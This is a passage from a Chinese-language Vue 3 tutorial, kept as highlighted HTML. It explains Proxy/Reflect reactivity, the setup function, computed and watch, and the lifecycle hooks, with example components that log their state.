&#125;,</span><br><span class="line">    <span class="comment">// 拦截设置属性值或添加新属性</span></span><br><span class="line">    set (target, prop, value) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Reflect</span>.set(target, prop, value)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 拦截删除属性</span></span><br><span class="line">    deleteProperty (target, prop) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Reflect</span>.deleteProperty(target, prop)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">proxy.name = <span class="string">&#x27;tom&#x27;</span>  </span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Proxy 与 Reflect<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    </span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> user = &#123;</span></span><br><span class="line"><span class="javascript">      <span class="attr">name</span>: <span class="string">&quot;John&quot;</span>,</span></span><br><span class="line"><span class="javascript">      <span class="attr">age</span>: <span class="number">12</span></span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">/* </span></span></span><br><span class="line"><span class="comment"><span class="javascript">    proxyUser是代理对象, user是被代理对象</span></span></span><br><span class="line"><span class="comment"><span class="javascript">    后面所有的操作都是通过代理对象来操作被代理对象内部属性</span></span></span><br><span class="line"><span class="comment"><span class="javascript">    */</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> proxyUser = <span class="keyword">new</span> <span class="built_in">Proxy</span>(user, &#123;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      <span class="function"><span class="title">get</span>(<span class="params">target, prop</span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">&#x27;劫持get()&#x27;</span>, prop)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="built_in">Reflect</span>.get(target, prop)</span></span><br><span class="line"><span class="javascript">      &#125;,</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      <span class="function"><span class="title">set</span>(<span class="params">target, prop, val</span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">&#x27;劫持set()&#x27;</span>, prop, val)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="built_in">Reflect</span>.set(target, prop, val); <span class="comment">// (2)</span></span></span><br><span class="line"><span class="javascript">      &#125;,</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">      deleteProperty (target, prop) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">&#x27;劫持delete属性&#x27;</span>, prop)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="built_in">Reflect</span>.deleteProperty(target, prop)</span></span><br><span class="line"><span class="javascript">      &#125;</span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 读取属性值</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(proxyUser===user)</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(proxyUser.name, proxyUser.age)</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 设置属性值</span></span></span><br><span class="line"><span class="javascript">    proxyUser.name = <span class="string">&#x27;bob&#x27;</span></span></span><br><span class="line"><span class="javascript">    proxyUser.age = <span class="number">13</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(user)</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 添加属性</span></span></span><br><span class="line"><span class="javascript">    proxyUser.sex = <span class="string">&#x27;男&#x27;</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(user)</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 删除属性</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">delete</span> proxyUser.sex</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(user)</span></span><br><span class="line"><span class="javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="setup执行的时机"><a href="#setup执行的时机" class="headerlink" title="setup执行的时机"></a>setup执行的时机</h1><ul><li>setup执行的时机<ul><li>在beforeCreate之前执行(一次), 此时组件对象还没有创建</li><li>this是undefined, 不能通过this来访问data/computed/methods / props</li><li>其实所有的composition API相关回调函数中也都不可以</li></ul></li><li>setup的返回值<ul><li>一般都返回一个对象: 为模板提供数据, 也就是模板中可以直接使用此对象中的所有属性/方法</li><li>返回对象中的属性会与data函数返回对象的属性合并成为组件对象的属性</li><li>返回对象中的方法会与methods中的方法合并成功组件对象的方法</li><li>如果有重名, setup优先</li><li>注意:</li><li>一般不要混合使用: methods中可以访问setup提供的属性和方法, 但在setup方法中不能访问data和methods</li><li>setup不能是一个async函数: 因为返回值不再是return的对象, 而是promise, 模板看不到return对象中的属性数据</li></ul></li><li>setup的参数<ul><li>setup(props, context) / setup(props, {attrs, slots, emit})</li><li>props: 包含props配置声明且传入了的所有属性的对象</li><li>attrs: 包含没有在props配置中声明的属性的对象, 相当于 this.$attrs</li><li>slots: 包含所有传入的插槽内容的对象, 相当于 this.$slots</li><li>emit: 用来分发自定义事件的函数, 相当于 this.$emit</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h2&gt;App&lt;/h2&gt;</span><br><span class="line">  &lt;p&gt;msg: &#123;&#123;msg&#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;button @click=&quot;fn(&#x27;--&#x27;)&quot;&gt;更新&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">  &lt;child :msg=&quot;msg&quot; msg2=&quot;cba&quot; @fn=&quot;fn&quot;/&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123;</span><br><span class="line">  reactive,</span><br><span class="line">  ref,</span><br><span class="line">&#125; from &#x27;vue&#x27;</span><br><span class="line">import child from &#x27;./child.vue&#x27;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line"></span><br><span class="line">  components: &#123;</span><br><span class="line">    child</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  setup () &#123;</span><br><span class="line">    const msg = ref(&#x27;abc&#x27;)</span><br><span class="line"></span><br><span class="line">    function fn (content: string) &#123;</span><br><span class="line">      msg.value += content</span><br><span class="line">    &#125;</span><br><span class="line">    return &#123;</span><br><span class="line">      msg,</span><br><span class="line">      fn</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h3&gt;&#123;&#123;n&#125;&#125;&lt;/h3&gt;</span><br><span class="line">    &lt;h3&gt;&#123;&#123;m&#125;&#125;&lt;/h3&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h3&gt;msg: &#123;&#123;msg&#125;&#125;&lt;/h3&gt;</span><br><span class="line">    &lt;h3&gt;msg2: &#123;&#123;$attrs.msg2&#125;&#125;&lt;/h3&gt;</span><br><span class="line"></span><br><span class="line">    &lt;slot name=&quot;xxx&quot;&gt;&lt;/slot&gt;</span><br><span class="line"></span><br><span class="line">    &lt;button @click=&quot;update&quot;&gt;更新&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line"></span><br><span class="line">import &#123;</span><br><span class="line">  ref,</span><br><span class="line">  defineComponent</span><br><span class="line">&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">export default defineComponent(&#123;</span><br><span class="line">  name: &#x27;child&#x27;,</span><br><span class="line"></span><br><span class="line">  props: [&#x27;msg&#x27;],</span><br><span class="line"></span><br><span class="line">  emits: [&#x27;fn&#x27;], // 可选的, 声明了更利于程序员阅读, 且可以对分发的事件数据进行校验</span><br><span class="line"></span><br><span class="line">  data () &#123;</span><br><span class="line">    console.log(&#x27;data&#x27;, this)</span><br><span class="line">    return &#123;</span><br><span class="line">      // n: 1</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  beforeCreate () &#123;</span><br><span class="line">    console.log(&#x27;beforeCreate&#x27;, this)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  methods: &#123;</span><br><span class="line">    // update () &#123;</span><br><span class="line">    //   this.n++</span><br><span class="line">    //   this.m++</span><br><span class="line">    // &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  // setup (props, context) &#123;</span><br><span class="line">  setup (props, &#123;attrs, emit, slots&#125;) &#123;</span><br><span class="line"></span><br><span class="line">    console.log(&#x27;setup&#x27;, this)</span><br><span class="line">    console.log(props.msg, attrs.msg2, slots, emit)</span><br><span class="line"></span><br><span class="line">    const m = ref(2)</span><br><span class="line">    const n = ref(3)</span><br><span class="line"></span><br><span class="line">    function update () &#123;</span><br><span class="line">      // console.log(&#x27;--&#x27;, this)</span><br><span class="line">      // this.n += 2 </span><br><span class="line">      // this.m += 2</span><br><span class="line"></span><br><span class="line">      m.value += 2</span><br><span class="line">      n.value += 2</span><br><span class="line"></span><br><span class="line">      // 分发自定义事件</span><br><span class="line">      emit(&#x27;fn&#x27;, &#x27;++&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">      m,</span><br><span class="line">      n,</span><br><span class="line">      update,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="计算属性与监视"><a href="#计算属性与监视" class="headerlink" title="计算属性与监视"></a>计算属性与监视</h1><ul><li>computed函数:<ul><li>与computed配置功能一致</li><li>只有getter</li><li>有getter和setter</li></ul></li><li>watch函数<ul><li>与watch配置功能一致</li><li>监视指定的一个或多个响应式数据, 一旦数据变化, 就自动执行监视回调</li><li>默认初始时不执行回调, 但可以通过配置immediate为true, 来指定初始时立即执行第一次</li><li>通过配置deep为true, 来指定深度监视</li></ul></li><li>watchEffect函数<ul><li>不用直接指定要监视的数据, 回调函数中使用的哪些响应式数据就监视哪些响应式数据</li><li>默认初始时就会执行第一次, 从而可以收集需要监视的数据</li><li>监视数据发生变化时回调</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h2&gt;App&lt;/h2&gt;</span><br><span class="line">  fistName: &lt;input v-model=&quot;user.firstName&quot;/&gt;&lt;br&gt;</span><br><span class="line">  lastName: &lt;input v-model=&quot;user.lastName&quot;/&gt;&lt;br&gt;</span><br><span class="line">  fullName1: &lt;input v-model=&quot;fullName1&quot;/&gt;&lt;br&gt;</span><br><span class="line">  fullName2: &lt;input v-model=&quot;fullName2&quot;&gt;&lt;br&gt;</span><br><span class="line">  fullName3: &lt;input v-model=&quot;fullName3&quot;&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">/*</span><br><span class="line">计算属性与监视</span><br><span class="line">1. computed函数: </span><br><span class="line">  与computed配置功能一致</span><br><span class="line">  只有getter</span><br><span class="line">  有getter和setter</span><br><span class="line">2. watch函数</span><br><span class="line">  与watch配置功能一致</span><br><span class="line">  监视指定的一个或多个响应式数据, 一旦数据变化, 就自动执行监视回调</span><br><span class="line">  默认初始时不执行回调, 但可以通过配置immediate为true, 来指定初始时立即执行第一次</span><br><span class="line">  通过配置deep为true, 来指定深度监视</span><br><span class="line">3. watchEffect函数</span><br><span class="line">  不用直接指定要监视的数据, 回调函数中使用的哪些响应式数据就监视哪些响应式数据</span><br><span class="line">  默认初始时就会执行第一次, 从而可以收集需要监视的数据</span><br><span class="line">  监视数据发生变化时回调</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">import &#123;</span><br><span class="line">  reactive,</span><br><span class="line">  ref,</span><br><span class="line">  computed,</span><br><span class="line">  watch,</span><br><span class="line">  watchEffect</span><br><span class="line">&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line"></span><br><span class="line">  setup () &#123;</span><br><span class="line">    const user = reactive(&#123;</span><br><span class="line">      firstName: &#x27;A&#x27;,</span><br><span class="line">      lastName: &#x27;B&#x27;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    // 只有getter的计算属性</span><br><span class="line">    const fullName1 = computed(() =&gt; &#123;</span><br><span class="line">      console.log(&#x27;fullName1&#x27;)</span><br><span class="line">      return user.firstName + &#x27;-&#x27; + user.lastName</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    // 有getter与setter的计算属性</span><br><span class="line">    const fullName2 = computed(&#123;</span><br><span class="line">      get () &#123;</span><br><span class="line">        console.log(&#x27;fullName2 get&#x27;)</span><br><span class="line">        return user.firstName + &#x27;-&#x27; + user.lastName</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      set (value: string) &#123;</span><br><span class="line">        console.log(&#x27;fullName2 set&#x27;)</span><br><span class="line">        const names = value.split(&#x27;-&#x27;)</span><br><span class="line">        user.firstName = names[0]</span><br><span class="line">        user.lastName = names[1]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    const fullName3 = ref(&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">    /* </span><br><span class="line">    watchEffect: 监视所有回调中使用的数据</span><br><span class="line">    */</span><br><span class="line">    /* </span><br><span class="line">    watchEffect(() =&gt; &#123;</span><br><span class="line">      console.log(&#x27;watchEffect&#x27;)</span><br><span class="line">      fullName3.value = user.firstName + &#x27;-&#x27; + user.lastName</span><br><span class="line">    &#125;) </span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    /* </span><br><span class="line">    使用watch的2个特性:</span><br><span class="line">      深度监视</span><br><span class="line">      初始化立即执行</span><br><span class="line">    */</span><br><span class="line">    watch(user, () =&gt; &#123;</span><br><span class="line">      fullName3.value = user.firstName + &#x27;-&#x27; + user.lastName</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      immediate: true,  // 是否初始化立即执行一次, 默认是false</span><br><span class="line">      deep: true, // 是否是深度监视, 默认是false</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    /* </span><br><span class="line">    watch一个数据</span><br><span class="line">      默认在数据发生改变时执行回调</span><br><span class="line">    */</span><br><span class="line">    watch(fullName3, (value) =&gt; &#123;</span><br><span class="line">      console.log(&#x27;watch&#x27;)</span><br><span class="line">      const names = value.split(&#x27;-&#x27;)</span><br><span class="line">      user.firstName = names[0]</span><br><span class="line">      user.lastName = names[1]</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    /* </span><br><span class="line">    watch多个数据: </span><br><span class="line">      使用数组来指定</span><br><span class="line">      如果是ref对象, 直接指定</span><br><span class="line">      如果是reactive对象中的属性,  必须通过函数来指定</span><br><span class="line">    */</span><br><span class="line">    watch([() =&gt; user.firstName, () =&gt; user.lastName, fullName3], (values) =&gt; &#123;</span><br><span class="line">      console.log(&#x27;监视多个数据&#x27;, values)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">      user,</span><br><span class="line">      fullName1,</span><br><span class="line">      fullName2,</span><br><span class="line">      fullName3</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h1><p><strong>与 2.x 版本生命周期相对应的组合式 API</strong></p><ul><li><code>beforeCreate</code> -&gt; 使用 <code>setup()</code></li><li><code>created</code> -&gt; 使用 <code>setup()</code></li><li><code>beforeMount</code> -&gt; <code>onBeforeMount</code></li><li><code>mounted</code> -&gt; <code>onMounted</code></li><li><code>beforeUpdate</code> -&gt; <code>onBeforeUpdate</code></li><li><code>updated</code> -&gt; <code>onUpdated</code></li><li><code>beforeDestroy</code> -&gt; <code>onBeforeUnmount</code></li><li><code>destroyed</code> -&gt; <code>onUnmounted</code></li><li><code>errorCaptured</code> -&gt; <code>onErrorCaptured</code></li></ul><p><strong>新增的钩子函数</strong></p><p>组合式 API 还提供了以下调试钩子函数：</p><ul><li>onRenderTracked</li><li>onRenderTriggered</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div class=&quot;about&quot;&gt;</span><br><span class="line">  &lt;h2&gt;msg: &#123;&#123;msg&#125;&#125;&lt;/h2&gt;</span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">  &lt;button @click=&quot;update&quot;&gt;更新&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123;</span><br><span class="line">  ref,</span><br><span class="line">  onMounted,</span><br><span class="line">  onUpdated,</span><br><span class="line">  onUnmounted, </span><br><span class="line">  onBeforeMount, </span><br><span class="line">  onBeforeUpdate,</span><br><span class="line">  onBeforeUnmount</span><br><span class="line">&#125; from &quot;vue&quot;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  beforeCreate () &#123;</span><br><span class="line">    console.log(&#x27;beforeCreate()&#x27;)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  created () &#123;</span><br><span class="line">    console.log(&#x27;created&#x27;)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  beforeMount () &#123;</span><br><span class="line">    console.log(&#x27;beforeMount&#x27;)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  mounted () &#123;</span><br><span class="line">    console.log(&#x27;mounted&#x27;)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  beforeUpdate () &#123;</span><br><span class="line">    console.log(&#x27;beforeUpdate&#x27;)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  updated () &#123;</span><br><span class="line">    console.log(&#x27;updated&#x27;)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  beforeUnmount () &#123;</span><br><span class="line">    console.log(&#x27;beforeUnmount&#x27;)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  unmounted () &#123;</span><br><span class="line">     console.log(&#x27;unmounted&#x27;)</span><br><span class="line">  &#125;,</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  setup() &#123;</span><br><span class="line">    </span><br><span class="line">    const msg = ref(&#x27;abc&#x27;)</span><br><span class="line"></span><br><span class="line">    const update = () =&gt; &#123;</span><br><span class="line">      msg.value += &#x27;--&#x27;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    onBeforeMount(() =&gt; &#123;</span><br><span class="line">      console.log(&#x27;--onBeforeMount&#x27;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    onMounted(() =&gt; &#123;</span><br><span class="line">      console.log(&#x27;--onMounted&#x27;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    onBeforeUpdate(() =&gt; &#123;</span><br><span class="line">      console.log(&#x27;--onBeforeUpdate&#x27;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    onUpdated(() =&gt; &#123;</span><br><span class="line">      console.log(&#x27;--onUpdated&#x27;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    onBeforeUnmount(() =&gt; &#123;</span><br><span class="line">      console.log(&#x27;--onBeforeUnmount&#x27;)</span><br><span class="line">    &#125;)</span><br><span 